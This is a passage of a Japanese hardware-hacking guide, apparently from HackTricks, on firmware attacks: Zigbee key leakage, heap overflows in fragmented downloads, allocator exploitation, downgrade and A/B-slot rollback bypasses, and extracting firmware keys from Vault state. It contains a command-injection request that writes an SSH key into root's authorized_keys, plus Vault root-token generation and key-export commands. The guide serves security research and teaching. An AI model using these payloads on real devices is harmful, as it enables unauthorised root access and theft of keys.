- どのメッセージが**ネットワーク**から送信され、どのメッセージがコントローラー自体から送信されるか
- 正確な**メーカー固有の識別フィールド**（例: Zigbeeの`manufacturer_code`と独自の`cluster_command`）
- **commissioning**、discovery、firmware/modelのダウンロード段階でのみ到達可能なハンドラー

特にZigbeeでは、ペアリング通信をキャプチャし、対象がデフォルトの**Link Key**`ZigBeeAlliance09`に依然として依存しているか確認します。依存している場合、commissioning通信を盗聴すると**Network Key**が漏えいする可能性があります。Zigbee 3.0のinstall codeはこのリスクを軽減するため、テスト対象のデバイスが実際にそれを強制しているか確認します。

### メーカー固有プロトコルハンドラーとFSMで制御される到達可能性

ベンダー固有のZigbee/ZCLコマンドは、標準化されたclusterよりも有望な標的となることがよくあります。**独自のパーサーコード**と、十分に検証されていない**内部FSM**に処理が渡るためです。<sup>[[8]](#references)</sup>

実践的なワークフロー:

- ベンダー専用の**ハンドラー**が見つかるまで、コマンドディスパッチャーをリバースします。
- **FSMの状態**、**イベント**、**チェック**、**アクション**、**次の状態**のテーブルを復元します。
- 自動的に次へ進む**遷移状態**と、最終的にリセットまたは攻撃者が制御する状態を解放するretry/error分岐を特定します。
- バグのあるハンドラーが常に到達可能だと思い込まず、脆弱な状態にデーモンを移行させるために必要な正規プロトコルのやり取りを確認します。

タイミングに敏感なプロトコルでは、Python frameworkからのpacket replayは遅すぎる場合があります。より確実な方法は、ベンダーグレードのstackを備えた実機（例: **nRF52840**）で正規デバイスをエミュレートし、正しい**endpoints**、**attributes**、commissioningのタイミングを再現することです。

### 組み込みデーモンにおけるフラグメント化ダウンロードのバグクラス

**フラグメント化されたblob/model/configurationのダウンロード**では、繰り返し発生するファームウェアのバグクラスがあります。<sup>[[8]](#references)</sup>

1. **最初のフラグメント**（`offset == 0`）で`ctx->total_size`を保存し、`malloc(total_size)`を実行する。
2. 後続のフラグメントでは、`packet_total_size >= offset + chunk_len`のような、攻撃者が制御できる**パケット単位の**フィールドだけを検証する。
3. コピー処理では、**最初に確保したサイズ**に対する検証をせずに、`memcpy(&ctx->buffer[offset], chunk, chunk_len)`を実行する。

これにより、攻撃者は次のことができます。

- **小さな**宣言済みtotal sizeを使った有効な最初のフラグメントを送り、小さなヒープ領域を確保させる。
- **想定されるoffset**を指定しつつ、より大きな`chunk_len`を持つ後続フラグメントを送る。
- 新たなチェックを通過しながら、最初に確保されたバッファをオーバーフローさせる、偽装したパケット単位のサイズを指定する。

脆弱な処理経路がcommissioningロジックの背後にある場合、悪意のあるフラグメントを送信する前に、モデルダウンロードまたはblobダウンロードの想定状態へ対象を移行させるための十分な**デバイスエミュレーション**が必要です。

### プロトコルを利用した`free()`のトリガー

組み込みデーモンでは、ヒープメタデータの悪用を引き起こす最も簡単な方法は、「クリーンアップを待つ」ことではなく、**プロトコル自体のエラー処理を強制する**ことです。<sup>[[8]](#references)</sup>

- 不正な後続フラグメントを送り、FSMを**retry**または**error**状態に移行させます。
- retryのしきい値を超えさせ、デーモンに**コンテキストをリセット**させて破損したバッファを解放させます。
- 予測可能なこの`free()`を利用して、無関係な原因でプロセスがクラッシュする前に、allocator側のプリミティブをトリガーします。

これは、組み込みLinuxの**musl/uClibc/dlmalloc系**allocatorに特に有効です。chunkメタデータの破損により、unlink/unbinロジックをwrite primitiveに変えられる可能性があるためです。安定した手法は、size fieldを破損させ、実際のbin pointerをすぐに上書きしてプロセスをクラッシュさせるのではなく、オーバーフローしたバッファ内に配置した**偽のchunk**へallocatorの探索を誘導することです。

## Binary ExploitationとProof-of-Concept

特定された脆弱性のPoC開発には、対象アーキテクチャへの深い理解と、低水準言語でのプログラミングが必要です。組み込みシステムではバイナリ実行時の保護機構はまれですが、実装されている場合はReturn Oriented Programming (ROP)などの手法が必要になることがあります。

### uClibc fastbinの悪用に関する注意点（組み込みLinux）

- **Fastbinsとconsolidation:** uClibcはglibcと同様のfastbinを使用します。後続の大きなallocationによって`__malloc_consolidate()`が呼び出される可能性があるため、偽のchunkはチェック（妥当なsize、`fd = 0`、周辺のchunkが「使用中」と認識されること）を通過する必要があります。<sup>[[6]](#references)</sup>
- **ASLR下のnon-PIEバイナリ:** ASLRが有効でも、メインバイナリが**non-PIE**なら、バイナリ内の`.data/.bss`アドレスは安定しています。有効なheap chunk headerにすでに似ている領域を標的にすれば、fastbin allocationを**関数ポインタテーブル**に配置できます。
- **パーサーを停止させるNUL:** JSONのパース時に、payload内の`\x00`でパースを停止させながら、後続の攻撃者制御バイトをstack pivot/ROP chain用に残せます。
- **`/proc/self/mem`経由のshellcode:** `open("/proc/self/mem")`、`lseek()`、`write()`を呼び出すROP chainを使うと、既知のmappingに実行可能なshellcodeを書き込み、そこへジャンプできます。

## Firmware Analysis用の準備済みOS

[AttifyOS](https://github.com/adi0x90/attifyos)や[EmbedOS](https://github.com/scriptingxss/EmbedOS)などのOSは、ファームウェアのセキュリティテストに必要なツールを備えた、事前設定済みの環境を提供します。

## ファームウェア解析用の準備済みOS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOSは、Internet of Things (IoT)デバイスのセキュリティ評価とpentestingを支援するためのディストリビューションです。必要なツールをすべて読み込んだ事前設定済みの環境を提供するため、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing toolsをあらかじめ搭載した、Ubuntu 18.04ベースの組み込みセキュリティテスト用OSです。

## Firmware Downgrade Attacksと安全でないUpdate Mechanism

ベンダーがファームウェアイメージの暗号署名チェックを実装していても、**バージョンのrollback（downgrade）保護は省略されることがよくあります**。bootまたはrecovery loaderが、埋め込み公開鍵を使って署名を検証するだけで、書き込むイメージの*version*（または単調増加カウンター）を比較しない場合、攻撃者は**有効な署名が付いた古い脆弱なファームウェア**を正規にインストールし、修正済みの脆弱性を再び悪用可能にできます。<sup>[[4]](#references)</sup>

一般的な攻撃ワークフロー:

1. **古い署名済みイメージを入手する**
   * ベンダーの公開ダウンロードポータル、CDN、またはサポートサイトから入手します。
   * 関連するモバイル/デスクトップアプリケーションから抽出します（例: Android APK内の`assets/firmware/`）。
   * VirusTotal、Internet Archive、フォーラムなどのサードパーティリポジトリから入手します。
2. 公開されているupdate channelを使って、イメージをデバイスに**アップロードするか、デバイスに配信する**:
   * Web UI、モバイルアプリAPI、USB、TFTP、MQTTなど。
   * 多くの一般向けIoTデバイスには、Base64エンコードされたファームウェアblobを受け付け、サーバー側でデコードしてrecovery/upgradeを開始する、*認証されていない*HTTP(S) endpointがあります。
3. downgrade後、新しいリリースで修正された脆弱性を悪用します（例: 後のリリースで追加されたcommand-injection filter）。
4. 必要に応じて、永続化を確立した後、検出を避けるために最新イメージを再度書き込むか、updatesを無効にします。

### 例: Downgrade後のCommand Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

脆弱な（ダウングレードされた）firmwareでは、`md5`パラメータがサニタイズされずにshell commandへ直接連結されるため、任意のコマンドを注入できます（ここでは、SSH keyベースのroot accessを有効化しています）。後続のfirmwareバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は意味をなしません。<sup>[[4]](#references)</sup>

### モバイルアプリからのFirmware抽出

多くのベンダーは、Bluetooth/Wi-Fi経由でデバイスを更新できるよう、完全なfirmware imageをコンパニオンモバイルアプリに同梱しています。これらのパッケージは通常、`assets/fw/`や`res/raw/`などのパスにあるAPK/APEX内に暗号化されずに保存されています。`apktool`、`ghidra`、あるいは単純な`unzip`などのツールを使えば、物理ハードウェアに触れずに署名済みimageを取り出せます。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot設計におけるupdater限定のanti-rollback bypass

一部のベンダーは、anti-downgrade **ratchet**を実装していますが、それは*updater*のロジック内だけです（たとえば、CAN経由のUDSルーチン、recoveryコマンド、userspace OTA agentなど）。その後、**bootloader**がイメージの署名/CRCだけをチェックし、partition tableやslot metadataを信頼する場合、rollback protectionを回避できる可能性があります。<sup>[[7]](#references)</sup>

典型的な弱い設計：

- Firmware metadataにversion descriptorと**security ratchet** / 単調増加カウンターの両方が含まれる。
- updaterはイメージのratchetをpersistent storageに保存された値と比較し、古い署名付きイメージを拒否する。
- bootloaderはそのratchetを**解析せず**、選択されたslotから起動する前にheader、CRC、署名だけを検証する。
- Slotの有効化状態はpartition tableまたはslotごとのgeneration counterに別途保存され、検証済みfirmwareの正確なdigestとは**暗号学的に紐付けられていない**。

これにより、dual-slotシステムで**あるイメージを検証し、別のイメージを起動する**プリミティブが生まれます。攻撃者が、現行の署名付きイメージを使ってupdaterにslot Bを次回の起動先として設定させ、その後、再起動前にslot Bを上書きできる場合、bootloaderはすでにコミット済みのslot metadataだけを信頼するため、古いイメージを起動する可能性があります。

よくある悪用パターン：

1. **現行の署名付き**firmwareを非アクティブslotにアップロードし、通常の検証/切り替えルーチンを実行して、そのslotが次のアクティブslotになるようlayoutを設定する。
2. **まだ再起動しない**。同じsession内でslot準備/消去ルーチンを再度呼び出す。
3. 古いboot-stateまたはslot選択ロジックを悪用し、updaterに、昇格されたばかりの**同じ物理slot**を消去させる。
4. **より古いが、まだ署名が有効な**firmwareをそのslotに書き込む。
5. ratchetを強制する検証ルーチンをスキップし、直接再起動する。
6. bootloaderは昇格済みのslotを選択し、署名/整合性だけを検証して古いイメージを起動する。

A/B update実装をリバースエンジニアリングする際に確認する点：

- Slotの選択が、切り替え成功後に更新されない**起動時フラグ**から導出されている。
- `prepare_passive_slot()`のようなルーチンが、**現在コミット済みのlayout**ではなく古い状態に基づいてslotを消去する。
- `part_write_layout()`のような関数が、検証済みイメージのhashを保存せず、**generation counter** / active flagだけを更新する。
- Ratchetチェックがuserspaceまたはupdaterコードに実装されているが、ROM / bootloader / secure bootの各段階には**実装されていない**。
- 消去またはrecoveryルーチンが、slotの内容を削除して書き換えた後も、そのslotを起動可能として扱う。

### Update Logicの評価チェックリスト

* *update endpoint*の通信経路/認証は十分に保護されているか（TLS + authentication）？
* Flash前に、デバイスは**version number**または**単調増加するanti-rollback counter**を比較しているか？
* イメージはsecure boot chain内で検証されるか（例：ROM codeが署名をチェックする）？
* **bootloaderはupdaterと同じratchetを強制しているか**。それとも署名/CRCのチェックだけか？
* Slotの有効化metadataは、**検証済みfirmwareのdigest/versionに紐付けられているか**。それとも昇格後にslotを変更できるか？
* Slot切り替えの成功後、デバイスは再起動を強制されるか。それとも同じsession内で後続のupdate/消去ルーチンに引き続きアクセスできるか？
* Userland codeは追加の妥当性チェック（例：許可されたpartition map、model number）を行うか？
* *partial*または*backup*のupdate flowでも、同じ検証ロジックを再利用しているか？

> 💡  上記のいずれかが欠けている場合、そのプラットフォームはrollback attackに対して脆弱である可能性が高いです。

## 練習用の脆弱なfirmware

Firmwareの脆弱性を見つける練習には、以下の脆弱なfirmwareプロジェクトを出発点として利用してください。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 組み込みKMS/Vault stateからのfirmware復号鍵の復元

Update imageに少量のplaintext metadataと大容量の高エントロピーブロブが混在している場合は、総当たりを始める前にコンテナのトリアージを行ってください。<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使って、header、offset、行境界をダンプする。
- `Salted__`は通常、OpenSSL `enc`形式を示す。次の8 bytesがsaltで、残りがciphertext。
- `256` bytesにちょうどデコードされるBase64 fieldは、ランダムなfirmware password/session keyをラップするRSA-2048 ciphertextである可能性を強く示す。
- 同じファイルに含まれるDetached PGPデータは、多くの場合、真正性だけを保護する。機密性を担う仕組みだと決めつけないこと。

静的な鍵の探索（`grep`、`strings`、PEM/PGP検索）で見つからない場合は、private keyを探すだけでなく、**実際の復号処理経路**をリバースエンジニアリングしてください。

- Updater / management binaryを逆コンパイルし、暗号化されたblobをどの処理が読み込むか、どのhelper/APIがunwrapするか、どの論理key名を要求するかを追跡する。
- 展開したroot filesystem内で、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加え、unit fileやinit scriptを検索する。
- 平文の`vault operator unseal ...`、recovery key、bootstrap token、ローカルKMSのauto-unseal scriptは、private keyと同等のものとして扱う。

アプライアンスに元のVault binaryとstorage backendが含まれている場合、Vault内部の仕組みを再実装するより、その環境を再現する方が通常は簡単です。

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

root 権限で複製した KMS にアクセスできる場合:

- transit keys を隔離された clone 内でのみ export 可能にします: `vault write transit/keys/<name>/config exportable=true`
- unwrap key を export します: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS で使われている正確な padding/hash の組み合わせで試します。PKCS#1 v1.5 による復号や、デフォルトの OAEP による復号に失敗しても、その key が間違っているとは限りません。Vault を使うフローの多くは SHA-256 の OAEP を使いますが、一般的なライブラリのデフォルトは SHA-1 です。
- payload が `Salted__` で始まる場合は、AES-CBC 復号を試す前に、ベンダーの OpenSSL KDF（`EVP_BytesToKey`。レガシー機器では MD5 が使われることがよくあります）を正確に再現します。

これにより、「暗号化された firmware」の解析は、より一般的な問題になります。**機器側の運用 key を復元し、正確な unwrap + KDF パラメーターをオフラインで再現します。**

## トレーニングと認定資格

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude による firmware の解析: シニアレベルのスキルとジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing の手法](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: モノのインターネットを攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放置された hardware の zero-day を悪用する – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 ドルの smart device から、どうやってあなたの家へのアクセスを得たのか](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [mi が見えたら、もう乗っ取られている](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 充電ポートコネクターから Tesla Wall Connector を悪用する - Part 2: downgrade 防止機能の回避](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [点滅させよう: Philips Hue Bridge の over-the-air exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU 上の Tesla OS で root を取得する Part 1: unpacking](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel documentation - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU 上の Tesla OS で root を取得する Part 2: debugging と修正](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS password: 弱い XOR 暗号化により SPI Flash から復元可能 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password の復元ツール](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Hardware Hacking のおさらい Part 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
